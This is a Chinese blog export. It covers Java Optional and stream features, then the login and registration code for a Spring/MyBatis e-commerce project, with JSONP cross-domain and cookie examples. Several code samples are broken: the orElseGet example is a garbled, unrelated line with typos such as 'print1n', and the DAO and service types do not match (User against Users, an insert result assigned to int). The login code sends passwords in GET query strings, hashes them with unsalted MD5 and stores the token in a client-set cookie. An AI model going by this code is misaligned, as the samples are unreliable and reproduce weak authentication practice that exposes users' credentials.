<p>如果你确定一个对象不是空的则可以使用Optional的静态方法of来把数据封装成Optional对象。</p>
<pre><code class="hljs java">Optional&lt;List&lt;Author&gt;&gt; optionalAuthors = Optional.of(authors);</code></pre>

<p>如果一个方法的返回值是Optional类型，而如果经过我们判断后，发现返回值为null,这时候需要将null封装成Optional对象返回。需要调用Optional的静态方法<code>empty()</code>进行封装</p>
<pre><code class="hljs java">Optional.empty()</code></pre>



<h3 id="3-2-2-安全消费数据"><a href="#3-2-2-安全消费数据" class="headerlink" title="3.2.2 安全消费数据"></a>3.2.2 安全消费数据</h3><p>我们获取到一个Optional对象后肯定需要对其中的数据进行使用。这时候我们可以使用其ifPresent方法对来消费其中的值.<br>这个方法会判断其内封装的数据是否为空，不为空时才会执行具体的消费代码。这样使用起来就更加安全了。<br>例如,以下写法就优雅的避免了空指针异常。</p>
<pre><code class="hljs java">Optional&lt;List&lt;Author&gt;&gt; optionalAuthors = Optional.of(authors);
optionalAuthors.ifPresent(authors1 -&gt; System.out.println(authors1.size()));</code></pre>

<h3 id="3-2-3-获取值"><a href="#3-2-3-获取值" class="headerlink" title="3.2.3 获取值"></a>3.2.3 获取值</h3><p>直接使用<code>get()</code>函数即可获取被封装的数据，但是当存入的数据是null时，会出现异常</p>
<h3 id="3-2-4-安全地获取值"><a href="#3-2-4-安全地获取值" class="headerlink" title="3.2.4 安全地获取值"></a>3.2.4 安全地获取值</h3><p>如果我们期望安全的获取值。我们不推荐使用get方法，而是使用Optional提供的以下方法。</p>
<h4 id="orElseGet"><a href="#orElseGet" class="headerlink" title="orElseGet"></a>orElseGet</h4><p>获取数据并且设置数据为空时的默认值。如果数据不为空就能获取到该数据。如果为空则根据你传入的参数来创建对象作为默认值返回。</p>
<pre><code class="hljs java">Optional&lt;Author&gt; authoroptional = optional.ofNullable(getAuthor());
authoroptional.filter(author -&gt; author,getAge()&gt;<span class="hljs-number">100</span>)ifpresent(author -&gt;system.out.print1n(author .getName()));</code></pre>

<p>orElseThrow<br>获取数据，如果数据不为空就能获取到该数据。如果为空则根据你传入的参数来创建异常抛出。</p>
<h3 id="3-2-5-过滤"><a href="#3-2-5-过滤" class="headerlink" title="3.2.5 过滤"></a>3.2.5 过滤</h3><p>我们可以使用filter方法对数据进行过滤。如果原本是有数据的，但是不符合判断，也会变成一个无数据的Optional对象。</p>
<h3 id="3-2-6-判断"><a href="#3-2-6-判断" class="headerlink" title="3.2.6 判断"></a>3.2.6 判断</h3><p>我们可以使用isPresent方法进行是否存在数据的判断。如果为空返回值为false,如果不为空，返回值为true。但是这种方式并不能体现<br>Optional的好处，更推荐使用ifPresent方法。</p>
<h3 id="3-2-7-数据转换"><a href="#3-2-7-数据转换" class="headerlink" title="3.2.7 数据转换"></a>3.2.7 数据转换</h3><p>Optional还提供了map可以让我们的对数据进行转换，并且转换得到的数据也还是被Optional包装好的，保证了我们的使用安全。<br>例如我们想获取作家的书籍集合。</p>
<h1 id="4-函数式接口的常用方法"><a href="#4-函数式接口的常用方法" class="headerlink" title="4.函数式接口的常用方法"></a>4.函数式接口的常用方法</h1><h2 id="and"><a href="#and" class="headerlink" title="and"></a>and</h2><p>在使用predicate接口时，可能需要进行条件的拼接。and方法就相当于&amp;&amp;符号实现拼接两个判断条件</p>
<p>例如</p>
<p>打印作家中年龄大于17并且姓名长度大于2的作家</p>
<pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();
authors.stream().filter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Predicate</span>&lt;Author&gt;() &#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">test</span><span class="hljs-params">(Author author)</span> &#123;
        <span class="hljs-keyword">return</span> author.getAge() &gt; <span class="hljs-number">17</span>;
    &#125;
&#125;.and(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Predicate</span>&lt;Author&gt;() &#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">test</span><span class="hljs-params">(Author author)</span> &#123;
        <span class="hljs-keyword">return</span> author.getName().length() &gt; <span class="hljs-number">2</span>;
    &#125;
&#125;)).forEach(System.out::println);


        authors.stream().filter(((Predicate&lt;Author&gt;) author -&gt; author.getAge() &gt; <span class="hljs-number">17</span>).and(author -&gt; author.getName().length() &gt; <span class="hljs-number">2</span>)).forEach(System.out::println);
</code></pre>



<h2 id="or"><a href="#or" class="headerlink" title="or"></a>or</h2><p>而or方法相当于是使用||来拼接两个判断条件。</p>
<p>例子</p>
<p>打印作家中年龄大于17或者姓名长度大于2的作家</p>
<pre><code class="hljs java">authors.stream().filter(((Predicate&lt;Author&gt;) author -&gt; author.getAge() &gt; <span class="hljs-number">17</span>).or(author -&gt; author.getName().length() &gt; <span class="hljs-number">2</span>)).forEach(System.out::println);
</code></pre>



<h2 id="negat"><a href="#negat" class="headerlink" title="negat"></a>negat</h2><p>就是取反操作，相当于<code>!</code></p>
<h1 id="5-stream的高级用法"><a href="#5-stream的高级用法" class="headerlink" title="5.stream的高级用法"></a>5.stream的高级用法</h1><h2 id="基本数据类型优化"><a href="#基本数据类型优化" class="headerlink" title="基本数据类型优化"></a>基本数据类型优化</h2><p>之前用到的很多Stream的方法由于都使用了泛型。所以涉及到的参数和返回值都是引用数据类型。<br>即使我们操作的是整教小数，但是实际用的都是他们的包装类。IDK5中引入的自动装箱和自动拆箱让我们在使用对应的包装类时就好像使用基本数据类型一样方便。但是你一定要知道装箱和拆箱肯定是要消耗时间的。虽然这个时间消耗很下。但是在大量的数据不断的重复装箱拆箱的时候，你就不能无视这个时间损耗了<br>所以为了让我们能够对这部分的时间消耗进行优化。Stream还提供了很多专门针对基本数据类型的方法。例如: mapTolnt,mapToLong,mapToDouble,flatMapTolnt,flatMapToDouble等</p>
<pre><code class="hljs java">authors.stream()
    .map(Author::getAge)
    .map(age -&gt; age + <span class="hljs-number">10</span>)
    .filter(age -&gt; age &gt; <span class="hljs-number">18</span>)
    .forEach(System.out::println);

authors.stream()
    .mapToInt(Author::getAge)
    .map(age -&gt; age + <span class="hljs-number">10</span>)
    .filter(age -&gt; age &gt; <span class="hljs-number">18</span>)
    .forEach(System.out::println);</code></pre>

<h2 id="并行流"><a href="#并行流" class="headerlink" title="并行流"></a>并行流</h2><p>当流中有大量元素时，我们可以使用并行流去提高操作的效率。其实并行流就是把任务分配给多个线程去完全。如果我们自己去用代码实现的话其实会非常的复杂，并且要求你对并发编程有足够的理解和认识。而如果我们使用Stream的话，我们只需要修改一个方法的调用就可以使用并行流来帮我们实现，从而提高效率。</p>
<pre><code class="hljs java">authors.stream().parallel()
    .peek(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Consumer</span>&lt;Author&gt;() &#123;
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Author author)</span> &#123;
            System.out.println(author.getName() + Thread.currentThread().getName());
        &#125;
    &#125;)
    .map(Author::getAge)
    .map(age -&gt; age + <span class="hljs-number">10</span>)
    .filter(age -&gt; age &gt; <span class="hljs-number">18</span>)
    .forEach(System.out::println);

authors.parallelStream()
    .peek(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Consumer</span>&lt;Author&gt;() &#123;
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Author author)</span> &#123;
            System.out.println(author.getName() + Thread.currentThread().getName());
        &#125;
    &#125;)
    .map(Author::getAge)
    .map(age -&gt; age + <span class="hljs-number">10</span>)
    .filter(age -&gt; age &gt; <span class="hljs-number">18</span>)
    .forEach(System.out::println);</code></pre>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>stream</tag>
      </tags>
  </entry>
  <entry>
    <title>fmmall</title>
    <url>/2022/07/18/fmmall/</url>
    <content><![CDATA[<p>商城项目</p>
<p>项目地址：<a href="https://github.com/sunzhengyu99/fmmall/tree/master">https://github.com/sunzhengyu99/fmmall/tree/master</a></p>
<p>体验地址：<a href="http://www.fmmall.top/">http://www.fmmall.top/</a></p>
<h2 id="1-业务逻辑开发"><a href="#1-业务逻辑开发" class="headerlink" title="1.业务逻辑开发"></a>1.业务逻辑开发</h2><h3 id="1-1登录注册"><a href="#1-1登录注册" class="headerlink" title="1.1登录注册"></a>1.1登录注册</h3><p>1.1.1 完成dao操作</p>
<ol>
<li><p>创建实体类</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.entity;

<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;
<span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> lombok.NoArgsConstructor;

<span class="hljs-keyword">import</span> java.sql.Date;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Users</span> &#123;
    <span class="hljs-keyword">private</span> Integer userId;
    <span class="hljs-keyword">private</span> String username;
    <span class="hljs-keyword">private</span> String password;
    <span class="hljs-keyword">private</span> String nickname;
    <span class="hljs-keyword">private</span> String realname;
    <span class="hljs-keyword">private</span> String userImg;
    <span class="hljs-keyword">private</span> String userMobile;
    <span class="hljs-keyword">private</span> String userEmail;
    <span class="hljs-keyword">private</span> String userSex;
    <span class="hljs-keyword">private</span> Date userBirth;
    <span class="hljs-keyword">private</span> Date userRegtime;
    <span class="hljs-keyword">private</span> Date userModtime;
&#125;
</code></pre>


</li>
<li><p>编写UserDao文件</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.dao;

<span class="hljs-keyword">import</span> com.sunzy.fmmall.entity.User;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.entity.Users;
<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Mapper;

<span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserDao</span> &#123;
    
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">queryUserByName</span><span class="hljs-params">(String name)</span>;
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">insertUser</span><span class="hljs-params">(Users user)</span>;
&#125;
</code></pre>


</li>
<li><p>编写UserMapper.xml</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.dao.UserDao&quot;</span>&gt;</span>


  <span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.Users&quot;</span>&gt;</span>
    <span class="hljs-comment">&lt;!--</span>
<span class="hljs-comment">      WARNING - @mbg.generated</span>
<span class="hljs-comment">    --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;password&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;nickname&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;nickname&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;realname&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;realname&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_img&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userImg&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_mobile&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userMobile&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_email&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userEmail&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_sex&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;CHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userSex&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_birth&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DATE&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userBirth&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_regtime&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userRegtime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_modtime&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userModtime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertUser&quot;</span>&gt;</span>
    insert into users(username, password, user_img, user_regtime, user_modtime)
    values(#&#123;username&#125;, #&#123;password&#125;,#&#123;userImg&#125;, #&#123;userRegtime&#125;,#&#123;userModtime&#125;)
  <span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;queryUserByName&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>
    select
      user_id,
      username,
      password,
      nickname,
      realname,
      user_img,
      user_mobile,
      user_email,
      user_sex,
      user_birth,
      user_regtime,
      user_modtime
    from users
    where
      username = #&#123;name&#125;
  <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span></code></pre></li>
</ol>
<p>1.1.2 完成service功能</p>
<ol>
<li><p>创建接口<code>com.sunzy.fmmall.service.UserService</code></p>
<pre><code class="hljs haxe"><span class="hljs-keyword">package</span> com.sunzy.fmmall.service;

<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResultVO;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserService</span> </span>&#123;

    <span class="hljs-keyword">public</span> ResultVO login(<span class="hljs-keyword">String</span> username, <span class="hljs-keyword">String</span> password);
    <span class="hljs-keyword">public</span> ResultVO regist(<span class="hljs-keyword">String</span> username, <span class="hljs-keyword">String</span> password);

&#125;</code></pre>


</li>
<li><p>创建实现类 <code>com.sunzy.fmmall.service.Impl.UserServiceImpl</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.service.Impl;

<span class="hljs-keyword">import</span> com.sunzy.fmmall.dao.UserDao;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.entity.Users;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.service.UserService;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.utils.MD5Utils;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResStatus;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResultVO;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-keyword">import</span> javax.annotation.Resource;
<span class="hljs-keyword">import</span> java.util.Date;


<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;


    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> UserDao userDao;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">login</span><span class="hljs-params">(String username, String password)</span> &#123;

        <span class="hljs-type">Users</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userDao.queryUserByName(username);
        <span class="hljs-keyword">if</span>(user == <span class="hljs-literal">null</span>)&#123;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, <span class="hljs-string">&quot;用户不存在！&quot;</span>, <span class="hljs-literal">null</span>);
        &#125;
        <span class="hljs-type">String</span> <span class="hljs-variable">realPasswd</span> <span class="hljs-operator">=</span> user.getPassword();
        <span class="hljs-keyword">if</span>(realPasswd.equals(MD5Utils.md5(password)))&#123;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK, <span class="hljs-string">&quot;登录成功！&quot;</span>, user);
        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, <span class="hljs-string">&quot;密码错误！&quot;</span>, <span class="hljs-literal">null</span>);
        &#125;
    &#125;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">regist</span><span class="hljs-params">(String username, String password)</span> &#123;
        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>)&#123;
            <span class="hljs-comment">// 判断用户是否已经注册</span>
            <span class="hljs-type">Users</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userDao.queryUserByName(username);
            <span class="hljs-keyword">if</span>(user == <span class="hljs-literal">null</span>)&#123;
                <span class="hljs-comment">// 将新用户信息添加到数据库中</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">md5</span> <span class="hljs-operator">=</span> MD5Utils.md5(password);
                user = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Users</span>();
                user.setPassword(md5);
                user.setUsername(username);
                user.setUserImg(<span class="hljs-string">&quot;img/default.png&quot;</span>);
                user.setUserRegtime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());
                user.setUserModtime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());

                <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> userDao.insertUser(user);
                <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">0</span>)&#123;
                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK, <span class="hljs-string">&quot;用户注册成功！&quot;</span>, user);
                &#125;<span class="hljs-keyword">else</span> &#123;
                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, <span class="hljs-string">&quot;用户注册失败！&quot;</span>, <span class="hljs-literal">null</span>);
                &#125;
            &#125;<span class="hljs-keyword">else</span>&#123;
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, <span class="hljs-string">&quot;用户已被注册！&quot;</span>, <span class="hljs-literal">null</span>);
            &#125;
        &#125;
    &#125;
&#125;
</code></pre></li>
</ol>
<p>1.1.3 完成controller代码</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.controller;

<span class="hljs-keyword">import</span> com.sunzy.fmmall.entity.Users;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.service.UserService;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResultVO;
<span class="hljs-keyword">import</span> io.swagger.annotations.Api;
<span class="hljs-keyword">import</span> io.swagger.annotations.ApiImplicitParam;
<span class="hljs-keyword">import</span> io.swagger.annotations.ApiImplicitParams;
<span class="hljs-keyword">import</span> io.swagger.annotations.ApiOperation;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;


<span class="hljs-comment">//@RequestBody</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(&quot;/user&quot;)</span>
<span class="hljs-meta">@Api(value = &quot;用户管理&quot;, tags = &quot;提供用户注册和登录接口&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> &#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;

    <span class="hljs-meta">@ApiOperation(&quot;用户登录接口&quot;)</span>
    <span class="hljs-meta">@ApiImplicitParams(&#123;</span>
<span class="hljs-meta">            @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;username&quot;, value = &quot;用户账号&quot;, required = true),</span>
<span class="hljs-meta">            @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;password&quot;, value = &quot;用户密码&quot;, required = true)</span>
<span class="hljs-meta">    &#125;)</span>
    <span class="hljs-meta">@GetMapping(&quot;/login&quot;)</span>
    <span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">login</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username,</span>
<span class="hljs-params">                          <span class="hljs-meta">@RequestParam(&quot;password&quot;)</span> String password)</span>&#123;
        <span class="hljs-keyword">return</span> userService.login(username, password);
    &#125;

    <span class="hljs-meta">@ApiOperation(&quot;用户注册接口&quot;)</span>
<span class="hljs-comment">//    @ApiImplicitParams(&#123;</span>
<span class="hljs-comment">//            @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;username&quot;, value = &quot;用户注册账号&quot;, required = true),</span>
<span class="hljs-comment">//            @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;password&quot;, value = &quot;用户注册密码&quot;, required = true)</span>
<span class="hljs-comment">//    &#125;)</span>
    <span class="hljs-meta">@PostMapping(&quot;/regist&quot;)</span>
    <span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">regist</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Users user)</span>&#123;
        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> user.getUsername();
        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> user.getPassword();
        <span class="hljs-keyword">return</span> userService.regist(username, password);
    &#125;
&#125;
</code></pre>

<p>1.1.4 接口测试</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710210231769.png" alt="image-20220710210231769"></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710210251564.png" alt="image-20220710210251564"></p>
<h3 id="1-2-解决前后端跨域问题"><a href="#1-2-解决前后端跨域问题" class="headerlink" title="1.2 解决前后端跨域问题"></a>1.2 解决前后端跨域问题</h3><p>1.1 前端</p>
<p><strong>通过jsonp跨域</strong></p>
<p>通常为了减轻web服务器的负载，我们把js、css，img等静态资源分离到另一台独立域名的服务器上，在html页面中再通过相应的标签从不同域名下加载静态资源，而被浏览器允许，基于此原理，我们可以通过动态创建script，再请求一个带参网址实现跨域通信。</p>
<pre><code class="hljs js">&lt;script&gt;
   <span class="hljs-keyword">var</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);
   script.<span class="hljs-property">type</span> = <span class="hljs-string">&#x27;text/javascript&#x27;</span>;

   <span class="hljs-comment">// 传参一个回调函数名给后端，方便后端返回时执行这个在前端定义的回调函数</span>
   script.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;http://www.domain2.com:8080/login?user=admin&amp;callback=handleCallback&#x27;</span>;
   <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">appendChild</span>(script);

   <span class="hljs-comment">// 回调执行函数</span>
   <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleCallback</span>(<span class="hljs-params">res</span>) &#123;
       <span class="hljs-title function_">alert</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(res));
   &#125;
&lt;/script&gt;</code></pre>

<p>1.2 后端</p>
<p>只需要在controller中添加<code>@CrossOrigin</code>注解即可允许后端响应数据进行跨域响应。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712100855420.png" alt="image-20220712100855420"></p>
<h3 id="1-3-将用户信息显示在前端"><a href="#1-3-将用户信息显示在前端" class="headerlink" title="1.3 将用户信息显示在前端"></a>1.3 将用户信息显示在前端</h3><p>在前端登录（login.html的doSubmit方法中）的ajax请求的响应代码中加入以下内容</p>
<pre><code class="hljs js"><span class="hljs-keyword">if</span>(vo.<span class="hljs-property">code</span> == <span class="hljs-number">10000</span>)&#123;
    <span class="hljs-comment">//如果登录成功，就把token存储到cookie</span>
    <span class="hljs-title function_">setCookieValue</span>(<span class="hljs-string">&quot;token&quot;</span>,vo.<span class="hljs-property">msg</span>);
    <span class="hljs-comment">//将用户昵称和用户头像的路径保存在cookie</span>
    <span class="hljs-title function_">setCookieValue</span>(<span class="hljs-string">&quot;userId&quot;</span>,vo.<span class="hljs-property">data</span>.<span class="hljs-property">userId</span>);
    <span class="hljs-title function_">setCookieValue</span>(<span class="hljs-string">&quot;username&quot;</span>,vo.<span class="hljs-property">data</span>.<span class="hljs-property">username</span>);
    <span class="hljs-title function_">setCookieValue</span>(<span class="hljs-string">&quot;userImg&quot;</span>,vo.<span class="hljs-property">data</span>.<span class="hljs-property">userImg</span>)
&#125;</code></pre>

<p>即登录成功后，将用户的token和用户信息一同保存到cookie中，用于前端传值</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712103807945.png" alt="image-20220712103807945"></p>
<p>在index.html的created函数中添加以下代码</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> token = <span class="hljs-title function_">getCookieValue</span>(<span class="hljs-string">&quot;token&quot;</span>);
<span class="hljs-keyword">if</span>(token !=<span class="hljs-literal">null</span> &amp;&amp; token !=<span class="hljs-string">&quot;&quot;</span>)&#123;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isLogin</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">username</span> = <span class="hljs-title function_">getCookieValue</span>(<span class="hljs-string">&quot;username&quot;</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">userimg</span> = <span class="hljs-title function_">getCookieValue</span>(<span class="hljs-string">&quot;userImg&quot;</span>);
&#125;</code></pre>

<p>获取到用户的基本信息，再通过v-model显示到前端页面中。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712103740058.png" alt="image-20220712103740058"></p>
<h3 id="1-4-首页轮播图"><a href="#1-4-首页轮播图" class="headerlink" title="1.4 首页轮播图"></a>1.4 首页轮播图</h3><ul>
<li><p>数据库操作实现</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712104939741.png" alt="image-20220712104939741"></p>
</li>
<li><p>编写sql语句</p>
